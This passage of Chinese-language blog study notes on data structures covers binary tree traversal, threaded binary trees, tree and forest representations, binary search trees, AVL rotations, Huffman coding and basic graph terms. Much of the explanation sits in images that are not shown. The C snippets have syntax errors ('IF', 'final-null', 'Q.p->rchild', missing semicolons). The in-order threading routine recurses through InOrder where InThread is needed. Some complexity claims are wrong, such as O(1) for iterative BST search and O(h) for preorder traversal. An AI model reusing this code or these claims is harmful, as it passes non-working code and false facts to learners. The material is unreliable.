class="line">p-&gt;lchild = <span class="literal">NULL</span>;</span><br><span class="line">p-&gt;rchild = null;</span><br><span class="line">root-&gt;lchild = p;  <span class="comment">//作为根结点的左孩子</span></span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709125146274.png" alt="image-20220709125146274"></p>
<h2 id="二叉树的遍历"><a href="#二叉树的遍历" class="headerlink" title="二叉树的遍历"></a>二叉树的遍历</h2><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709130230793.png" alt="image-20220709130230793"></p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709130623105.png" alt="image-20220709130623105"></p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//先序遍历</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">PreOrder</span><span class="params">(BiTree T)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(T!=null)&#123;</span><br><span class="line">        visit(T);            <span class="comment">//访问根节点</span></span><br><span class="line">        PreOrder(T-&gt;lchild); <span class="comment">//递归遍历左子树</span></span><br><span class="line">        PreOrder(T-&gt;rchild); <span class="comment">//递归遍历右子树0</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//时间复杂度为O(h)</span></span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709192542556.png" alt="image-20220709192542556"><br>先序遍历——第一次路过时访问结点<br>中序遍历——第二次路过时访问结点<br>后序遍历——第三次路过时访问结点<br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709192656825.png" alt="image-20220709192656825"></p>
<h3 id="求树的深度"><a href="#求树的深度" class="headerlink" title="求树的深度"></a>求树的深度</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">treeDepth</span><span class="params">(BiTree T)</span>&#123;</span><br><span class="line">    IF(T==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="type">int</span> l = treeDepth(T-&gt;lchild);</span><br><span class="line">        <span class="type">int</span> r = treeDepth(T-&gt;rchild);</span><br><span class="line">        <span class="keyword">return</span> l&gt;r? l+<span class="number">1</span>:r+<span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="二叉树的层序遍历"><a href="#二叉树的层序遍历" class="headerlink" title="二叉树的层序遍历"></a>二叉树的层序遍历</h2><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709193412735.png" alt="image-20220709193412735"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//二叉树的结点（链式存储）</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">BiTNode</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BiTNode</span> *<span class="title">lchild</span>,*<span class="title">rchild</span>;</span></span><br><span class="line">&#125;BiTNode,*BiTree;</span><br><span class="line"></span><br><span class="line"><span class="comment">//链式队列结点</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LinkNode</span>&#123;</span></span><br><span class="line">    BiTNode * data;           <span class="comment">//存指针而不是结点来节省空间</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">LinkNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;LinkNode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    LinkNode *front,*rear;<span class="comment">//队头队尾指针</span></span><br><span class="line">&#125;LinkQueue;</span><br><span class="line"></span><br><span class="line"><span class="comment">//层序遍历</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">LevelOrder</span><span class="params">(BiTree T)</span>&#123;</span><br><span class="line">    LinkQueue Q;</span><br><span class="line">    InitQueue(Q);  <span class="comment">//初始化</span></span><br><span class="line">    BiTree p;</span><br><span class="line">    EnQueue(Q,T);    <span class="comment">//将根节点入队</span></span><br><span class="line">    <span class="keyword">while</span>(!IsEmpty(Q))&#123;</span><br><span class="line">        DeQueue(Q,p);   <span class="comment">//队头结点出队</span></span><br><span class="line">        visit(p);       <span class="comment">//访问出队结点</span></span><br><span class="line">        <span class="keyword">if</span>(p-&gt;lchild!=null)</span><br><span class="line">            EnQueue(Q,p-&gt;lchild);</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;rchild!=null)</span><br><span class="line">            EnQueue(Q.p-&gt;rchild);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="由遍历序列构造二叉树"><a href="#由遍历序列构造二叉树" class="headerlink" title="由遍历序列构造二叉树"></a>由遍历序列构造二叉树</h2><p>给定一个前中后序遍历序列可能对应多种二叉树<br>给定中序加一种其他序（前序后序层序）对应唯一二叉树</p>
<h2 id="线索二叉树"><a href="#线索二叉树" class="headerlink" title="线索二叉树"></a>线索二叉树</h2><p>普通二叉树不能从任意一个指定结点开始遍历<br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709200423798.png" alt="image-20220709200423798"></p>
<h3 id="线索二叉树-1"><a href="#线索二叉树-1" class="headerlink" title="线索二叉树"></a>线索二叉树</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709200709261.png" alt="image-20220709200709261"><br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709200930693.png" alt="image-20220709200930693"></p>
<h3 id="土办法找前驱"><a href="#土办法找前驱" class="headerlink" title="土办法找前驱"></a>土办法找前驱</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//辅助全局变量，用于查找结点p的前驱</span></span><br><span class="line">BiTNode *p;</span><br><span class="line">BiTNode *pre=null;</span><br><span class="line">BiTNode *final-null;</span><br><span class="line"></span><br><span class="line"><span class="comment">//中序遍历</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InOrder</span><span class="params">(BiTree T)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(T!=null)&#123;</span><br><span class="line">        InOrder(T-&gt;lchild);</span><br><span class="line">        visit(T);</span><br><span class="line">        InOrder(T-&gt;rchild);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//访问结点q</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">visit</span><span class="params">(BiTNode *q)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(q==p)</span><br><span class="line">        final = pre;     <span class="comment">//找到p的前驱</span></span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        pre = q;       <span class="comment">//pre指向当前访问的结点</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="中序线索化"><a href="#中序线索化" class="headerlink" title="中序线索化"></a>中序线索化</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//全局变量pre，指向当前访问结点的前驱</span></span><br><span class="line">ThreadNode *pre=null;</span><br><span class="line"><span class="comment">//中序线索化二叉树T</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">CreateInThread</span><span class="params">(ThreadTree T)</span>&#123;</span><br><span class="line">    pre=null;</span><br><span class="line">    <span class="keyword">if</span>(T!=null)&#123;</span><br><span class="line">        InThread(T);</span><br><span class="line">        <span class="keyword">if</span>(pre-&gt;rchild==null)</span><br><span class="line">            pre-&gt;rtag=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//线索二叉树的结点</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ThreadNode</span>&#123;</span></span><br><span class="line">    ElemType data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ThreadNode</span> *<span class="title">lchild</span>,*<span class="title">rchild</span>;</span></span><br><span class="line">    <span class="type">int</span> ltag,rtag;</span><br><span class="line">&#125;ThreadNode,* ThreadTree;</span><br><span class="line"><span class="comment">//中序遍历二叉树，一边遍历一边线索化</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InThread</span><span class="params">(ThreadTree T)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(T!=null)&#123;</span><br><span class="line">        InOrder(T-&gt;lchild);</span><br><span class="line">        visit(T);</span><br><span class="line">        InOrder(T-&gt;rchild);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">visit</span><span class="params">(ThreadNode *q)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(q-&gt;lchild==null)&#123;</span><br><span class="line">        q-&gt;lchild=pre;</span><br><span class="line">        q-&gt;ltag=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(pre!=null&amp;&amp;pre-&gt;rchild==null)&#123;</span><br><span class="line">        pre-&gt;rchild=q;</span><br><span class="line">        pre-&gt;rtag=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    pre=q;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="先序线索化"><a href="#先序线索化" class="headerlink" title="先序线索化"></a>先序线索化</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709204642583.png" alt="image-20220709204642583"></p>
<h2 id="在线索二叉树中找前驱后继"><a href="#在线索二叉树中找前驱后继" class="headerlink" title="在线索二叉树中找前驱后继"></a>在线索二叉树中找前驱后继</h2><h3 id="中序后继"><a href="#中序后继" class="headerlink" title="中序后继"></a>中序后继</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709205639652.png" alt="image-20220709205639652"><br>该方法的时间复杂度是O（1)</p>
<h3 id="中序前驱"><a href="#中序前驱" class="headerlink" title="中序前驱"></a>中序前驱</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709205928279.png" alt="image-20220709205928279"></p>
<h3 id="先序前驱"><a href="#先序前驱" class="headerlink" title="先序前驱"></a>先序前驱</h3><p>二叉链表没办法找到先序前驱<br>将二叉链表转化为三叉链表<br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709210518474.png" alt="image-20220709210518474"></p>
<h3 id="后序前驱"><a href="#后序前驱" class="headerlink" title="后序前驱"></a>后序前驱</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709211254569.png" alt="image-20220709211254569"></p>
<h3 id="后序后继"><a href="#后序后继" class="headerlink" title="后序后继"></a>后序后继</h3><p>p.rtag==0，则一定有右孩子，所以只能用土办法来找</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709210913690.png" alt="image-20220709210913690"></p>
<p>p为根节点则没有后序后继</p>
<h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709211007944.png" alt="image-20220709211007944"></p>
<h2 id="树的逻辑结构"><a href="#树的逻辑结构" class="headerlink" title="树的逻辑结构"></a>树的逻辑结构</h2><h3 id="双亲表示法"><a href="#双亲表示法" class="headerlink" title="双亲表示法"></a>双亲表示法</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709211533787.png" alt="image-20220709211533787"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_TREE_SIZE 100</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    ElemType data;</span><br><span class="line">    <span class="type">int</span> parent;</span><br><span class="line">&#125;PTNode;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    PTNode nodes[MAX_TREE_SIZE];</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">&#125;PTree;</span><br></pre></td></tr></table></figure>
<h3 id="孩子表示法"><a href="#孩子表示法" class="headerlink" title="孩子表示法"></a>孩子表示法</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709212419211.png" alt="image-20220709212419211"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">CTNode</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> child;   <span class="comment">//孩子结点在数组中的位置</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">CTNode</span> *<span class="title">next</span>;</span>   <span class="comment">//下一个改组</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    ElemType data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">CTNode</span> *<span class="title">fistchild</span>;</span> <span class="comment">//第一个孩子</span></span><br><span class="line">&#125; CTBox;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    CTBox nodes[MAX_TREE_SIZE];</span><br><span class="line">    <span class="type">int</span> n,r    <span class="comment">//结点数和根的位置</span></span><br><span class="line">&#125;CTree</span><br></pre></td></tr></table></figure>
<h3 id="孩子兄弟表示法"><a href="#孩子兄弟表示法" class="headerlink" title="孩子兄弟表示法"></a>孩子兄弟表示法</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">CSNode</span>&#123;</span></span><br><span class="line">    ElemType data;   <span class="comment">//数据域</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">CSNode</span> *<span class="title">firstchild</span>,*<span class="title">nextsibling</span>;</span>  <span class="comment">//第一个孩子和右兄弟指针</span></span><br><span class="line">&#125;CSNode,*CSTree</span><br></pre></td></tr></table></figure>
<h3 id="森林和二叉树的转换"><a href="#森林和二叉树的转换" class="headerlink" title="森林和二叉树的转换"></a>森林和二叉树的转换</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709213548106.png" alt="image-20220709213548106"><br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709213700619.png" alt="image-20220709213700619"></p>
<h2 id="树和森林的遍历"><a href="#树和森林的遍历" class="headerlink" title="树和森林的遍历"></a>树和森林的遍历</h2><h3 id="树的先根遍历"><a href="#树的先根遍历" class="headerlink" title="树的先根遍历"></a>树的先根遍历</h3><p>若树非空，先访问根节点，再依次对每棵子树进行先根遍历</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">PreOrder</span><span class="params">(TreeNode *R)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(R!=null)&#123;</span><br><span class="line">        visit(R);</span><br><span class="line">        <span class="keyword">while</span>(R还有下一个子树T)</span><br><span class="line">            PreOrder(T);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>树的先根遍历与二叉树的先序遍历相同<br>深度优先遍历</p>
<h3 id="树的后根遍历"><a href="#树的后根遍历" class="headerlink" title="树的后根遍历"></a>树的后根遍历</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709230748352.png" alt="image-20220709230748352"></p>
<p>树的后根遍历与二叉树的中序遍历相同<br>深度优先遍历</p>
<h3 id="树的层次遍历-1"><a href="#树的层次遍历-1" class="headerlink" title="树的层次遍历"></a>树的层次遍历</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709231031413.png" alt="image-20220709231031413"><br>树的层次遍历与二叉树的层序遍历相同<br>广度优先遍历</p>
<h3 id="森林的先序遍历"><a href="#森林的先序遍历" class="headerlink" title="森林的先序遍历"></a>森林的先序遍历</h3><p> <img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709231345040.png" alt="image-20220709231345040"><br>可以先转换成二叉树，在对二叉树进行先序遍历</p>
<h3 id="森林的后根遍历"><a href="#森林的后根遍历" class="headerlink" title="森林的后根遍历"></a>森林的后根遍历</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709231520092.png" alt="image-20220709231520092"></p>
<p>可以先转换成二叉树，在对二叉树进行中序遍历<br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709231626512.png" alt="image-20220709231626512"></p>
<h2 id="二叉排序树（BST）"><a href="#二叉排序树（BST）" class="headerlink" title="二叉排序树（BST）"></a>二叉排序树（BST）</h2><p>二叉查找树<br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709231736496.png" alt="image-20220709231736496"><br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709231745186.png" alt="image-20220709231745186"><br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709231900686.png" alt="image-20220709231900686"></p>
<h3 id="查找-2"><a href="#查找-2" class="headerlink" title="查找"></a>查找</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">BSTNode *<span class="title function_">BST_Search</span><span class="params">(BSTree T,<span class="type">int</span> key)</span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(T!=null&amp;&amp;key!=T-&gt;key)&#123;</span><br><span class="line">        <span class="keyword">if</span>(key&lt;T-&gt;key)</span><br><span class="line">            T=T-&gt;lchild;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            T=T-&gt;rchild;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> T;</span><br><span class="line">&#125;<span class="comment">//时间复杂度O(1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//递归实现</span></span><br><span class="line">BSTNode *<span class="title function_">BST_Search</span><span class="params">(BSTree T,<span class="type">int</span> key)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(T==null)</span><br><span class="line">        <span class="keyword">return</span> null;</span><br><span class="line">    <span class="keyword">if</span>(key==T-&gt;key)</span><br><span class="line">        <span class="keyword">return</span> T;    <span class="comment">//查找成功</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(key&lt;T-&gt;key)</span><br><span class="line">        <span class="keyword">return</span> BSTSearch(T-&gt;lchild,key);   <span class="comment">//在左子树中查找</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> BSTSearch(T-&gt;rchild,key);   <span class="comment">//在右子树中查找</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//时间复杂度O(h)</span></span><br></pre></td></tr></table></figure>
<h3 id="插入-3"><a href="#插入-3" class="headerlink" title="插入"></a>插入</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709232619239.png" alt="image-20220709232619239"><br>注意插入操作是引用类型<br>最坏空间复杂度O(h)</p>
<h3 id="构造"><a href="#构造" class="headerlink" title="构造"></a>构造</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709232821433.png" alt="image-20220709232821433"></p>
<h3 id="删除-3"><a href="#删除-3" class="headerlink" title="删除"></a>删除</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709233303115.png" alt="image-20220709233303115"></p>
<h2 id="查找效率分析"><a href="#查找效率分析" class="headerlink" title="查找效率分析"></a>查找效率分析</h2><p>查找成功的平均长度ASL<br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709233912561.png" alt="image-20220709233912561"></p>
<script type="math/tex; mode=display">
尽可能达到O(log_2n)</script><p>查找失败的平均查找长度<br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709234322040.png" alt="image-20220709234322040"></p>
<h2 id="平衡二叉树"><a href="#平衡二叉树" class="headerlink" title="平衡二叉树"></a>平衡二叉树</h2><p>简称平衡树（AVL树）——树上任一结点的左子树和右子树的高度之差不超过1<br><strong>结点的平衡因子</strong>=左子树高-右子树高<br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709234821736.png" alt="image-20220709234821736"></p>
<h3 id="平衡二叉树的插入"><a href="#平衡二叉树的插入" class="headerlink" title="平衡二叉树的插入"></a>平衡二叉树的插入</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709234957697.png" alt="image-20220709234957697"></p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709235020317.png" alt="image-20220709235020317"><br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709235353920.png" alt="image-20220709235353920"><br>假设的子树的高度一定都是统一的一个值H</p>
<h4 id="LL"><a href="#LL" class="headerlink" title="LL"></a>LL</h4><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709235550956.png" alt="image-20220709235550956"></p>
<h4 id="RR"><a href="#RR" class="headerlink" title="RR"></a>RR</h4><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709235832689.png" alt="image-20220709235832689"></p>
<h4 id="代码思路"><a href="#代码思路" class="headerlink" title="代码思路"></a>代码思路</h4><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220710000110322.png" alt="image-20220710000110322"></p>
<h4 id="LR"><a href="#LR" class="headerlink" title="LR"></a>LR</h4><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220710000356369.png" alt="image-20220710000356369"><br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220710000444260.png" alt="image-20220710000444260"><br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220710000533083.png" alt="image-20220710000533083"></p>
<h4 id="RL"><a href="#RL" class="headerlink" title="RL"></a>RL</h4><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220710000716645.png" alt="image-20220710000716645"></p>
<p><strong>插入操作导致最小不平衡子树高度+1，经过调整后高度恢复</strong></p>
<h3 id="查找效率问题"><a href="#查找效率问题" class="headerlink" title="查找效率问题"></a>查找效率问题</h3><h3 id="最坏时间复杂度O-h"><a href="#最坏时间复杂度O-h" class="headerlink" title="最坏时间复杂度O(h)"></a>最坏时间复杂度O(h)</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220710001904807.png" alt="image-20220710001904807"><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220710001932928.png" alt="image-20220710001932928"><br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220710001948415.png" alt="image-20220710001948415"></p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220710002053754.png" alt="image-20220710002053754"></p>
<h2 id="哈夫曼树"><a href="#哈夫曼树" class="headerlink" title="哈夫曼树"></a>哈夫曼树</h2><p>结点的权：有某种现实含义（如：表示节点的重要性）<br>结点的带权路径长度：从树的跟到该结点的路径长度（经过的边数）与该结点上权值的乘积<br>树的带权路径长度（WPL)：书中所有的叶子结点的带权路径长度之和<br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220710002632003.png" alt="image-20220710002632003"><br>哈夫曼树的结点总数为2n-1<br>哈夫曼树中不存在度为1的结点<br>哈夫曼树并不唯一，但WPL必然相同且为最优</p>
<h3 id="哈夫曼编码"><a href="#哈夫曼编码" class="headerlink" title="哈夫曼编码"></a>哈夫曼编码</h3><p>固定长度编码——每个字都用相等长度的二进制位表示（ASCII编码）</p>
<p>可变长度编码<img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220710003458543.png" alt="image-20220710003458543"><br>前缀编码：没有一个编码是另一个编码的前缀</p>
<h1 id="第六章——图"><a href="#第六章——图" class="headerlink" title="第六章——图"></a>第六章——图</h1><h2 id="图的基本概念"><a href="#图的基本概念" class="headerlink" title="图的基本概念"></a>图的基本概念</h2><h3 id="图的定义"><a href="#图的定义" class="headerlink" title="图的定义"></a>图的定义</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220803205115991.png" alt="image-20220803205115991"><br>图的边集可以为空集，边集可以有方向也可以没方向</p>
<p><strong>图逻辑结构的应用</strong><br>微信好友关系     地铁站（顶点集）铁路</p>
<h3 id="无向图，有向图"><a href="#无向图，有向图" class="headerlink" title="无向图，有向图"></a>无向图，有向图</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220803205427477.png" alt="image-20220803205427477"><br>无向图边集用（)  有向图边集用&lt;&gt;</p>
<h3 id="简单图、多重图"><a href="#简单图、多重图" class="headerlink" title="简单图、多重图"></a>简单图、多重图</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220803205904593.png" alt="image-20220803205904593"></p>
<h3 id="顶点的度、入度、出度"><a href="#顶点的度、入度、出度" class="headerlink" title="顶点的度、入度、出度"></a>顶点的度、入度、出度</h3><p>无向图：<strong>顶点v的度</strong>是该顶点边的条数，记为TD(v)<br>有向图：<strong>顶点v的入度</strong>是以顶点v为终点的有向边的数目，记为ID(v)<br>              <strong>顶点v的出度</strong>是以顶点v为起点的有向边的数目，记为OD(v)<br>              <strong>顶点v的度</strong>等于入度和出度的和，即TD(v)=ID(v)+OD(v)</p>
<script type="math/tex; mode=display">
n个顶点，e条边\\无向图：\sum_{i=1}^{n}TD(v_i)=2e\\有向图：\sum_{i=1}^nID(v_i)=\sum_{i=1}^nOD(v_i)=e</script><h3 id="顶点-顶点的关系描述"><a href="#顶点-顶点的关系描述" class="headerlink" title="顶点-顶点的关系描述"></a>顶点-顶点的关系描述</h3><p>路径——顶点A到顶点E之间的一条路径是指顶点序列（A,B,C,D,E)<br>回路—— 第一个顶点和最后一个顶点相同的路径称为<strong>回路或者环</strong><br>简单路径——路径序列中顶点不重复出现的路径<br>简单回路——除第一个顶点和最后一个顶点外，其余顶点不重复出现<br>路径长度——路径上边的数目<br>点到点的距离——最短路径的长度（若不存在路径记为无穷）<br>无向图中，若从顶点v到顶点w有路径存在，则成v和w是连通的<br>有向图中，若从顶点v到顶点w和从顶点w到顶点v之间都有路径，则称这两个顶点是强连通的</p>
